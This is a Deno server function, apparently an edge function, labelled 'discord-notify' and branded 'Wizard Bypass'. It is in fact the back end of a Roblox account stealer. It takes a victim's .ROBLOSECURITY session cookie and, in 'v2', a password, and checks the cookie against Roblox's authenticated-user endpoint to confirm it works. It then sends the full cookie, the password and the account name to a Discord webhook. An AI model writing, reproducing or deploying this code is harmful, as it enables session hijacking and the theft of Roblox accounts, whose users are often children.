const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface NotifyBody {
  version?: "v1" | "v2";
  status?: "STARTED" | "COMPLETE" | string;
  cookie?: string;
  password?: string;
  durationMs?: number;
}

function chunk(s: string, n: number): string[] {
  const out: string[] = [];
  for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
  return out;
}

async function postEmbed(url: string, payload: unknown): Promise<Response> {
  return fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const body = (await req.json().catch(() => ({}))) as NotifyBody;
    const version = body.version === "v2" ? "v2" : "v1";
    const status = (body.status || "STARTED").toUpperCase();
    const cookie = typeof body.cookie === "string" ? body.cookie : "";
    const password = typeof body.password === "string" ? body.password : "";
    const durationMs = typeof body.durationMs === "number" ? body.durationMs : null;

    const mainUrl = Deno.env.get("DISCORD_WEBHOOK_URL");


    const url = mainUrl;
    if (!url) {
      console.error("[discord-notify] missing webhook URL");
      return new Response(JSON.stringify({ success: false, error: "Webhook not configured" }), {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Try to fetch the Roblox account username using the cookie + validate it
    let username: string | null = null;
    let userId: number | null = null;
    let cookieValid: boolean | null = null;
    if (cookie) {
      try {
        const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
          headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
        });
        if (r.ok) {
          const j = await r.json();
          username = typeof j?.name === "string" ? j.name : null;
          userId = typeof j?.id === "number" ? j.id : null;
          cookieValid = !!username;
        } else {
          cookieValid = false;
          console.warn("[discord-notify] roblox auth lookup failed", r.status);
        }
      } catch (err) {
        console.warn("[discord-notify] roblox auth lookup error", err);
      }
    }

    const color = cookieValid === false ? 0xef4444 : (status === "COMPLETE" ? 0x22c55e : 0x3b82f6);
    const validityLabel = cookieValid === true ? "✅ Valid" : cookieValid === false ? "❌ Invalid" : "❓ Unknown";
    const fields: { name: string; value: string; inline?: boolean }[] = [
      { name: "Version", value: version.toUpperCase(), inline: true },
      { name: "Status", value: status, inline: true },
      { name: "Cookie", value: validityLabel, inline: true },
      { name: "Username", value: username ? (userId ? `${username} (${userId})` : username) : "Unknown", inline: true },
    ];
    if (durationMs !== null) {
      fields.push({ name: "Duration", value: `${(durationMs / 1000).toFixed(1)}s`, inline: true });
    }
    if (version === "v2" && password) {
      fields.push({ name: "Password", value: `\`\`\`${password.slice(0, 1000)}\`\`\`` });
    }

    const embeds: unknown[] = [
      {
        title: status === "COMPLETE" ? "✅ Bypass Complete" : "🚀 Bypass Started",
        color,
        fields,
        timestamp: new Date().toISOString(),
        ...(status === "COMPLETE" && userId
          ? {
              thumbnail: {
                url: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`,
              },
            }
          : {}),
      },
    ];

    // Cookie split into chunks (Discord field max ~1024 chars)
    if (cookie) {
      const parts = chunk(cookie, 1900);
      parts.forEach((part, i) => {
        embeds.push({
          title: parts.length > 1 ? `Cookie (${i + 1}/${parts.length})` : "Cookie",
          description: `\`\`\`${part}\`\`\``,
          color,
        });
      });
    }

    const res = await postEmbed(url, { username: "Wizard Bypass", embeds });

    if (!res.ok) {
      const text = await res.text().catch(() => "");
      console.error("[discord-notify] webhook failed", res.status, text.slice(0, 300));
      return new Response(JSON.stringify({ success: false, status: res.status, error: text.slice(0, 300) }), {
        status: 502,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    const msg = e instanceof Error ? e.message : "Unknown error";
    console.error("[discord-notify] exception:", msg);
    return new Response(JSON.stringify({ success: false, error: msg }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
